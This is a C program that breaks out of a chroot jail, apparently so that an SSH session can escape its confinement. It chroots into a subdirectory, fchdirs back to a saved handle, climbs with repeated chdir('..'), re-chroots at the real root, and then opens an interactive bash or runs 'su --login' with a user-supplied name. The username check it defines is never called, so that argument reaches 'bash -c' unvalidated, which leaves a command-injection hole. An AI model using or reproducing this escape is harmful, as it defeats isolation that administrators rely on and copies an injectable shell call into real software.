/* C99 */
/* Let SSH get out of the chroot jail. */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

#define TEMP_DIR "foo"

/* Validation check for supplied username */
/* Note: for simplicity, this function prints a correponding error message for invalid inputs. */
int is_valid_username(const char *username) {
    /* Test 1: String length. Pretty basic sanity check. Overall, the buffer should be less than 256 chars. */
    if (64 < strlen(username)) {
        fprintf(stderr, "Bad username. It is much too long! Username follows:\n%s\n", username);
        /* Failure */
        return 0;
    }

    /* Test 2: Contents of username. Should be REALLY straightforward. */
    /* Won't work with unicode, obviously. */
    unsigned int i;
    for (i=0; i < strlen(username); ++i) {
        /* Uses ctype.h functions */
        /* Check if current character satisfies the ctype requirement (alphanumeric). */
        if (!isalnum(username[i])) {
            fprintf(stderr, "Bad username. It is not alphanumeric. Username follows:\n%s\n", username);
            /* Failure */
            return 0;
        }
    }

    /* Success */
    return 1;
}

int main(int argc, char *argv[]) {
        int i;
        int dir_fd;
        struct stat sbuf;
        /* First we create the temporary directory if it doesn't exit. */
        if (stat(TEMP_DIR, &sbuf)<0) {
                if (errno == ENOENT) {
                        if (mkdir(TEMP_DIR, 0755)<0) {
                                fprintf(stderr, "Failed to create %s - %s\n",
                                        TEMP_DIR, strerror(errno));
                                exit(1);
                        }
                } else {
                        fprintf(stderr, "Failed to stat %s - %s\n",
                                TEMP_DIR, strerror(errno));
                        exit(1);
                }
        } else if (!S_ISDIR(sbuf.st_mode)) {
                fprintf(stderr, "Error - %s is not a directory!\n", TEMP_DIR);
                exit(1);
        }
        /* open the current working directory */
        if ((dir_fd=open(".", O_RDONLY))<0) {
                fprintf(stderr, "Failed to open \".\" for reading - %s\n",
                        strerror(errno));
                exit(1);
        }
        /* chroot to the temporary directory. This ensure chdir("..") has
           real effect and can reach the real root directory. */
        if (chroot(TEMP_DIR)<0) {
                fprintf(stderr, "Failed to chroot to %s - %s\n", TEMP_DIR,
                        strerror(errno));
                exit(1);
        }
        /* Partially break out of the chroot jail by doing an fchdir()
           This only partially breaks out of the chroot() jail since whilst
           our current working directory is outside the chroot jail, our
           root directory is still within it. Thus anything which refers to
           "/" will refer to files under the chroot point.
        */
        if (fchdir(dir_fd)<0) {
                fprintf(stderr, "Failed to fchdir - %s\n",
                        strerror(errno));
                exit(1);
        }
        close(dir_fd);
        /* Completely break out the chroot jail by recursing up the directory
           tree and doing a chroot to the current working directory (which will
           be the real "/" at that point). We do this by chdir("..") lots of
           times.
        */
        for (i=0; i<1024; i++) {
                chdir("..");
        }
        chroot(".");
        /* exec a bash in interactive mode */
	if (argc > 1) {
		/* Include supplied username */
		char switch_user_command[256];

                /* Note: we could just exec su --login directly, but that does not seem to initialize the environment correctly. */
		snprintf(
			switch_user_command,
			sizeof switch_user_command,
			"su --login %s",
			argv[1]);

		if (execl("/bin/bash", "-i", "-c", switch_user_command, NULL)<0) {
			fprintf(stderr, "Failed to exec - %s\n", strerror(errno));
			exit(1);
		} else {
			exit(0);
		}
        } else if (argc <= 1) {
		if (execl("/bin/bash", "-i", NULL)<0) {
			fprintf(stderr, "Failed to exec - %s\n", strerror(errno));
			exit(1);
		} else {
			exit(0);
		}
	}
        return 0;
}
